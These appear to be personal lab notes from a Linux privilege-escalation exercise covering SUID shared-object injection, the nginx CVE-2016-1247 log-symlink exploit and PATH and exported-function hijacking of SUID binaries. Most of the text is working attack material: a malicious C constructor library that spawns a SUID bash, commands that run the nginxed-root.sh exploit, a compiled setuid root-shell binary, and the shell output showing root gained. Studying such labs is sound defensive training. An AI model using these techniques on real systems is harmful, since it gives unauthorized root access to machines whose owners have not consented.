#suid 

### Shared Object Injection 
#nginx
- Look for the files with suid permissions. 
```
TCM@debian:~$ find / -type f -perm -04000 -ls 2>/dev/null
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Jun 18  2020 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517    8 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs

```

- Check out and run suid-so file. 
```
TCM@debian:~$ ls -la /usr/local/bin/suid-so
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
TCM@debian:~$ /usr/local/bin/suid-so
Calculating something, please wait...
[=====================================================================>] 99 %
Done.
TCM@debian:~$ strace /usr/local/bin/suid-so 2>&1
execve("/usr/local/bin/suid-so", ["/usr/local/bin/suid-so"], [/* 17 vars */]) = 0
brk(0)                                  = 0x2571000
fcntl(0, F_GETFD)                       = 0
fcntl(1, F_GETFD)                       = 0
fcntl(2, F_GETFD)                       = 0
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fc160a56000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
more and more....
```
- Filter out the output in more readable format
```
TCM@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)

```

- Create new directory and file with giving suid permission. We are using 'libcalc.c' for this purpose. 
```
TCM@debian:~$ nano libcalc.c
TCM@debian:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/libcalc.c
/usr/bin/ld: cannot open output file /home/user/.config/libcalc.so: No such file or directory
collect2: ld returned 1 exit status
TCM@debian:~$ mkdir /home/user/.config
TCM@debian:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/libcalc.c
TCM@debian:~$ /usr/local/bin/suid-so
Calculating something, please wait...
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1# cd /root
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1# whami
bash: whami: command not found
bash-4.1# whoami
root
```

- libcal.c file have this code. [[SUDO]]
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```


### Binary Symlinks 
https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html 

- First run the linux exploit suggester to find the vulnerability. 
```
sh-4.1$ ./linux-exploit-suggester.sh 

Kernel version: 2.6.32
Architecture: x86_64
Distribution: debian
Package list: from current OS
|
|
|

[+] [CVE-2016-1247] nginxed-root.sh

   Details: https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
   Tags: debian=8,ubuntu=14.04|16.04|16.10
   Download URL: https://legalhackers.com/exploits/CVE-2016-1247/nginxed-root.sh
   Comments: Rooting depends on cron.daily (up to 24h of dealy). Affected: deb8: <1.6.2; 14.04: <1.4.6; 16.04: 1.10.0
```


- Use Debain systems packages to find nginx and locate where the log file is. 
```
sh-4.1$ dpkg -l | grep nginx
ii  nginx-common                        1.6.2-5+deb8u2~bpo70+1       small, powerful, scalable web/proxy server - common files
ii  nginx-full                          1.6.2-5+deb8u2~bpo70+1       nginx web/proxy server (standard version)


sh-4.1$ ls -la /var/log/nginx
total 12
drwxr-x--- 2 www-data adm  4096 Jun 16  2020 .
drwxr-xr-x 9 root     root 4096 Aug 19 22:45 ..
-rw-r--r-- 1 www-data root    0 May 14  2017 access.log
-rw-r----- 1 www-data adm     0 Jun 16  2020 error.log
-rw-r--r-- 1 root     root 2438 May 14  2017 error.log.1

```

- Run the nginx script 
```
sh-4.1$ cd ..
sh-4.1$ cd nginx/
sh-4.1$ ls
nginxed-root.sh
sh-4.1$ ./nginxed-root.sh /var/log/nginx/error.log

```

- Log in another connection and tried to touch the previous ran script. 

```
──(kali㉿kali)-[~]
└─$ ssh root@10.10.55.255 -oHostKeyAlgorithms=+ssh-dss  
The authenticity of host '10.10.55.255 (10.10.55.255)' can't be established.
DSA key fingerprint is SHA256:p2NSsfvYJVk1Qe0tsNX5G2h8AaWYRn71jdz3uEodbMA.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
    ~/.ssh/known_hosts:2: [hashed name]
    ~/.ssh/known_hosts:9: [hashed name]
    ~/.ssh/known_hosts:10: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.55.255' (DSA) to the list of known hosts.
root@10.10.55.255's password: 
Permission denied, please try again.
root@10.10.55.255's password: 
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun 17 23:31:40 2020 from 192.168.4.51
root@debian:~# invoke-rc.d nginx rotate >/dev/null 2>&1

```

- Received root access in previous connect. 
```
The server is (N)jinxed ! ;) Got root via Nginx!

[+] Spawning the rootshell /tmp/nginxrootsh now! 

nginxrootsh-4.1# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
nginxrootsh-4.1# whoami
root
nginxrootsh-4.1# 

```

### Environmental Variables
#env
- Check the environment
```
TCM@debian:~$ env
TERM=xterm-256color
SHELL=/bin/bash
HISTSIZE=1000000
SSH_CLIENT=10.8.159.78 44524 22
SSH_TTY=/dev/pts/0
HISTFILESIZE=1000000
USER=TCM
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:
MAIL=/var/mail/TCM
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin
PWD=/home/user
LANG=en_US.UTF-8
SHLVL=1
HOME=/home/user
LOGNAME=TCM
SSH_CONNECTION=10.8.159.78 44524 10.10.55.255 22
_=/usr/bin/env
```

- Find the env location using find command
```
TCM@debian:~$ find / -type f -perm -04000 -ls 2>/dev/null
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Jun 18  2020 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517    8 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
1158725  912 -rwsrwxrwx   1 root     root       926536 Aug 19 23:17 /tmp/nginxrootsh
1158723  912 -rwsr-sr-x   1 root     staff      926536 Aug 19 23:00 /tmp/bash
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs

```

- Tried to run it and string it out. 
```
TCM@debian:~$ strings /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
```

- Print out the path. 
```
TCM@debian:~$ print $PATH
Warning: unknown mime-type for "/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin" -- using "application/octet-stream"
Error: no such file "/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin"
```

- Create service.c with suid priesc and run it
```
TCM@debian:~$ echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
TCM@debian:~$ gcc /tmp/service.c -o /tmp/service
TCM@debian:~$ export PATH=/tmp:$PATH
TCM@debian:~$ /usr/local/bin/suid-env
root@debian:~# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)

```

- Similar way to evn2 aswell but change function for this. #env2
```
TCM@debian:~$ function /usr/sbin/service() { cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p; }
TCM@debian:~$ export -f /usr/sbin/service 
TCM@debian:~$ /usr/local/bin/suid-env2
bash-4.1# id
uid=0(root) gid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1# whoami
root
```
